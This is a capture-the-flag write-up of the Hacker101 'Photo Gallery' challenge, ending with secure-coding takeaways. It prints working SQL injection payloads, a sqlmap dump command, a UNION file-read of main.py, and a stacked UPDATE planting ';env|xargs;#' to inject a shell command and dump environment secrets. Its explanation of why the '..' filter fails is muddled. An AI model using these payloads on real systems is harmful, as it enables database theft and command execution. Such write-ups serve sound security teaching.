# Photo Gallery (Moderate)

**Challenge:** Photo Gallery  
**Difficulty:** Moderate  
**Category:** Web / SQL Injection  
**Flags:** 3

---

## Overview

The challenge presents a "Magical Image Gallery" displaying three kitten photos under a single album. The homepage renders images via `fetch?id=` endpoints, with captions like "Utterly adorable," "Purrfect," and "Invisible." A "Space used: 0 total" footer hints at a system command.

**Server:** openresty/1.29.2.3, uwsgi-nginx-flask-docker, Python 2.7 Flask, MySQL (MariaDB)

The application suffers from three distinct vulnerabilities that each yield a flag:

1. **SQL injection** in the `id` parameter of `/fetch` — unparameterized query allows data extraction and file reads
2. **Source code disclosure** via SQL UNION injection — enables reading arbitrary files from the server
3. **Command injection** via stacked queries — shell commands in filenames execute through `subprocess.check_output(..., shell=True)`

---

## Reconnaissance

### Application Behavior

Browsing the application reveals:

- **GET /**: Displays three photos under album "Kittens" with `id=1..3`, plus "Space used: 0 total"
- **GET /fetch?id=N**: Returns the JPEG image for photo `N`; missing IDs return 404, invalid paths return 500
- **Common endpoints** (`/admin`, `/flag`, `/robots.txt`, etc.): All 404
- **Static files**: `/static/` exists but empty

### Initial SQL Injection Detection

The `id` parameter is vulnerable to boolean-based blind SQL injection:

```sql
-- True: returns image (HTTP 200)
/fetch?id=1 AND 1=1--

-- False: returns 404
/fetch?id=1 AND 1=2--

-- Syntax error: returns 500
/fetch?id=1'--

-- Stacked queries work (with caveats):
/fetch?id=1; SELECT 1;--
```

The back-end is MySQL (MariaDB fork), database `level5` with two tables: `photos` and `albums`.

### SQL Injection (sqlmap)

Automated extraction via sqlmap:

```bash
sqlmap -u "https://target.ctf.hacker101.com/fetch?id=1" \
  -D level5 -T photos --dump --technique=B
```

**Database schema:**

```sql
-- Table: photos (3 rows)
id | title            | parent | filename
 1 | Utterly adorable | 1      | files/adorable.jpg
 2 | Purrfect         | 1      | files/purrfect.jpg
 3 | Invisible        | 1      | `<redacted>`

-- Table: albums (1 row)
id | title
 1 | Kittens
```

Photo 3 ("Invisible") has a 64-character hex string as its `filename` — the first flag.

---

## Flag 1 — Hidden Database Value

**Method:** SQL injection data extraction (sqlmap)

The third photo's `filename` field contains a 64-character hex hash instead of a file path. The file doesn't exist on disk (fetching `id=3` returns 500), but the value itself is a flag:

> **Flag 1:** `^FLAG^<redacted>$FLAG$`

**Hints:** "I never trust a kitten I can't see" / "Or a query whose results I can't see, for that matter" — referencing both the invisible kitten and blind SQL injection.

---

## Flag 0 — Source Code Disclosure

**Method:** SQL UNION injection to read application source code

By exploiting the UNION SELECT with a hex-encoded file path, we can read arbitrary files accessible to the application:

```sql
-- Read main.py from the app root directory
/fetch?id=-1 UNION SELECT 0x6d61696e2e7079--
```

The `0x` prefix tells MySQL to interpret the value as a hex string. The query returns the filename `main.py`, which the app opens and returns as the response body.

**Discovered source code (`main.py`):**

```python
@app.route('/fetch')
def fetch():
    cur = getDb().cursor()
    if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0:
        abort(404)

    # It's dangerous to go alone, take this:
    # ^FLAG^<redacted>$FLAG$

    return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read()
```

Key observations:
- **Unparameterized query**: `%s` is Python string formatting, not a prepared statement placeholder
- **Path sanitization**: `.replace('..', '')` strips `..` from filenames (attempted but ineffective against UNION injection)
- **Flag in comment**: The flag is embedded directly in the source code

> **Flag 0:** `^FLAG^<redacted>$FLAG$`

**Hints:** "Consider how you might build this system yourself. What would the query for fetch look like?" / "Take a few minutes to consider the state of the union" / "This application runs on the uwsgi-nginx-flask-docker image" — the UNION hint plus knowledge of the Docker image's file layout (`/app/main.py`) guides the attack.

---

## Flag 2 — Command Injection via Stacked Queries

**Method:** Stacked SQL injection → UPDATE database → command injection via `du -ch`

### The Vulnerability

The homepage renders the "Space used" footer by executing a shell command with user-controlled filenames:

```python
rep += '<i>Space used: ' + subprocess.check_output(
    'du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns),
    shell=True, stderr=subprocess.STDOUT
).strip().rsplit('\n', 1)[-1] + '</i>'
```

Every photo filename is concatenated into a `du -ch files/<filename>` command with `shell=True`. If a filename contains shell metacharacters, arbitrary commands execute.

### The Attack Chain

**Step 1 — Inject a malicious filename via stacked SQL:**

```sql
-- UPDATE photo 1's filename to a shell command
/fetch?id=1; UPDATE photos SET filename=0x3b656e767c78617267733b23 WHERE id=1; COMMIT;--
```

The hex `0x3b656e767c78617267733b23` decodes to `;env|xargs;#`. This turns the `du` command into:

```bash
du -ch files/;env|xargs;# files/purrfect.jpg files/<hash>
```

Which executes: `du -ch files/` (harmless), then `env | xargs` (dumps all environment variables on one line), then `#` comments out the rest.

**Step 2 — Trigger the command by visiting the homepage:**

```bash
curl https://target.ctf.hacker101.com/
```

The response includes the full environment in the "Space used:" field, revealing the `FLAGS` environment variable containing all three flags as a JSON array.

> **Flag 2:** `^FLAG^<redacted>$FLAG$`

**Hints:** "That method of finding the size of an album seems suspicious" / "Stacked queries rarely work. But when they do, make absolutely sure that you're committed" / "Be aware of your environment" — referencing the `du` command, the need for `COMMIT` after stacked queries, and the environment variable storage.

---

## Complete Flag List

| Flag | Hash | Technique |
|:----:|------|-----------|
| 0 | `<redacted>` | UNION SQLi → read `main.py` source (comment) |
| 1 | `<redacted>` | Blind SQLi (sqlmap) → dump `photos.filename` |
| 2 | `<redacted>` | Stacked SQLi + COMMIT → command injection → `FLAGS` env var |

---

## Key Takeaways

1. **Parameterized queries are essential.** Python string formatting (`%s`) in SQL queries with user input is trivially exploitable. Use parameterized queries (e.g., `cursor.execute('...', (param,))`) regardless of how "internal" the parameter seems.

2. **SQL UNION injection enables file reads.** When a query result is used as a filesystem path, UNION SELECT can be weaponized to read arbitrary files — including source code, configuration, and environment files.

3. **`shell=True` is dangerous.** The `subprocess` module with `shell=True` combined with user-controlled input creates command injection. Always prefer `shell=False` with argument lists, or sanitize inputs aggressively.

4. **Stacked queries are powerful but delicate.** MariaDB/MySQL stacked queries require the connection to support multiple statements. The `COMMIT` statement was necessary because the application's transaction isolation required an explicit commit for the UPDATE to persist.

5. **Never store secrets in source code comments.** Flag 0 was literally a comment in `main.py` — comments are source code that runs in production. Use environment variables or secret management services.

6. **`.replace()` is not path sanitization.** The `replace('..', '')` filter is trivially bypassed through UNION injection (the injected value never passes through the database column's `.replace()` call at query time).

---

## References

- [Hacker101 CTF Platform](https://ctf.hacker101.com/)
- [uwsgi-nginx-flask-docker Image](https://github.com/tiangolo/uwsgi-nginx-flask-docker)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [sqlmap — Automatic SQL injection tool](https://sqlmap.org/)
